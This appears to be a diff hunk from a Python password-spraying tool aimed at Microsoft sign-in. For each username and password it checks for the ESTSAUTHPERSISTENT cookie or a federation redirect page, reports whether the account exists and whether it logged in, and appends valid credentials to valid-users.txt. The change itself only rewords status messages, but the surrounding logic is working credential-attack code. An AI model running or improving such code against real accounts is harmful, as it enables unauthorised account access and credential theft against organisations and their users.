@@ -285,35 +285,35 @@ for username in usernames:
                     cookies_dict = dict(response123.cookies)
                     if args.check:
                         if "ESTSAUTHPERSISTENT" in cookies_dict:
-                            print(f"{GREEN}[✓] success: User {username} is exist and seccessfully logged in with password: {password}")
+                            print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}")
                             with open("valid-users.txt", "a") as log_file:
                                 log_file.write(f"{username}:{password}\n")
                             break            
                         else:
                             if "<html><head><title>Working...</title></head>" in response123.text:
-                                print(f"{GREEN}[✓] success: {username} logged in with password: {password}, with Redirect Page to..")
+                                print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}:{password}\n")
                                 break
                             else:
-                                print(f"{YELLOW}[!] NOT-success: {username} exists, but password is incorrect: {password}")
+                                print(f"{BLUE}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}\n")
                                 
                     else :
                         if "ESTSAUTHPERSISTENT" in cookies_dict:
-                            print(f"{GREEN}[✓] success: User {username} is exist and seccessfully logged in with password: {password}")
+                            print(f"{GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}")
                             with open("valid-users.txt", "a") as log_file:
                                 log_file.write(f"{username}:{password}\n")
                             break            
                         else:
                             if "<html><head><title>Working...</title></head>" in response123.text:
-                                print(f"{GREEN}[✓] success: {username} logged in with password: {password}, with Redirect Page to..")
+                                print(f"{GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server")
                                 with open("valid-users.txt", "a") as log_file:
                                     log_file.write(f"{username}:{password}\n")
                                 break
                             else:
-                                print(f"{YELLOW}[!] NOT-success to authenticate with {username}, didn't check if user exists")   
+                                print(f"{YELLOW}[-] Failed to authenticate with {username}, didn't check if user exists")   
 
             except httpx.ReadTimeout:
                 print(f"{RED}[✗] Request timed out while checking user: {username}{RESET}")
